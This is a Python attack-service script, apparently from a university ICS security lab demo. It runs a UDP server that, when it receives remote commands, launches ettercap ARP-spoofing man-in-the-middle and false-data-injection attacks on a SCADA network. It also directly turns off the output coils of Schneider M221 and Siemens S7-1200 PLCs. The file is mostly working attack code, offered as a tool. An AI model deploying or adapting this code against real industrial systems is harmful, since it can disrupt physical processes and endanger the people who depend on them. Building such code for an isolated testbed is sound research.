#!/usr/bin/python
#-----------------------------------------------------------------------------
# Name:        attackServ.py [python2.7/python3]
#
# Purpose:     This module will create a attack service program to run the 
#              ettercap false data injection attack.
#               
# Author:      Yuancheng Liu
#
# Created:     2019/12/02
# Copyright:   NUS Singtel Cyber Security Research & Development Laboratory
# License:     YC @ NUS
#-----------------------------------------------------------------------------
import os
import sys
import time
import signal
import socket
import subprocess
# PLC control module:
import M2PLC221 as m221
import S7PLC1200 as s71200

SEV_IP = ('0.0.0.0', 5005)  # UDP server ip
BUFFER_SZ = 1024            # UPD receive buffer size

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class attackServ(object):
    """ UPD server to receive control cmd and call the attack *.ef file."""
    def __init__(self, parent):
        # Init the UDP server.
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(SEV_IP)
        self.terminate = False

#-----------------------------------------------------------------------------
    def changePLC(self):
        """ Turn off all the PLC output, change area indicate LED to 'red'."""
        print("Turning Off all the PLC coils: ")
        # Turn off M221 PLCs
        memList = ('M0', 'M10', 'M20', 'M60')
        # PLC 1 M221
        plc1 = m221.M221('192.168.10.72')
        for memAddr in memList:
            plc1.writeMem(memAddr, 0)
            time.sleep(0.3)
        plc1.writeMem('M60', 1)  # Turn the insudtrial LED to red.
        plc1.disconnect()
        print("Trun off PLC 1 output coils.")
        # PLC 2 M221
        plc2 = m221.M221('192.168.10.71')
        for memAddr in memList:
            plc2.writeMem(memAddr, 0)
            time.sleep(0.3)
        plc2.writeMem('M60', 1)  # Turn the city LED to red.
        plc2.disconnect()
        print("Trun off PLC 2 output coils.")
        # PLC3 S72100
        plc3 = s71200.S7PLC1200('192.168.10.73')
        for x in range(4):
            plc3.writeMem('qx0.'+str(x), False)
            time.sleep(0.3)
        plc3.writeMem('qx0.'+str(2), True)  # Turn the residentail LED to red.
        plc3.plc.disconnect()
        print("Trun off PLC 3 output coils.")
        print("Finished turn off all the PLC output.")

#-----------------------------------------------------------------------------
    def parseMsg(self, msg, addr):
        """ Parse the attack control message and do the attack."""
        print("Received msg: %s" % str(msg))
        tag, val = msg.split(';')
        if tag == 'C':
            print('Client connected.')
            msg = 'C;1'  # send back the connection confirm response.
            self.sock.sendto(msg.encode('utf-8'), addr)
        elif tag == 'A':
            if val == '1':
                print('Starting the attack:')
                # Use subprocess to run the ettercap attack script.
                atkStr = "sudo ettercap -T -q -F /home/pi/scada/demo/m221_3.ef -M ARP /192.168.10.21//"
                print(str(subprocess.Popen(atkStr, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)))
                time.sleep(1) # Sleep 1 sec to make sure the ettercap finished scanned the network,.
                self.changePLC()
            elif val == '2':
                print('Starting the false data injection attack:')
                atkStr = "sudo ettercap -T -q -F /home/pi/scada/demo/m221_1.ef -M ARP /192.168.10.21, 72//"
                print(str(subprocess.Popen(atkStr, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)))
                time.sleep(1) # Sleep 1 sec to make sure the ettercap finished scanned the network,.
            else:
                print('Stopping the attack.')
                # Find the ettercap process by ID and kill it.
                for line in os.popen("ps ax | grep ettercap | grep -v grep"):
                    pid = line.split()[0]
                    os.kill(int(pid), signal.SIGKILL) # SIGKILL only in linux. 
        

#-----------------------------------------------------------------------------
    def startSev(self):
        print('Server started.')
        while not self.terminate:
            data, address = self.sock.recvfrom(BUFFER_SZ)
            if not data: break
            if isinstance(data, bytes):
                self.parseMsg(data.decode(encoding="utf-8"), address)
            else:
                print('Data format invalid: %s' % str(data))

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    serv = attackServ(None)
    serv.startSev()
	
#-----------------------------------------------------------------------------
if __name__ == '__main__':
    main()
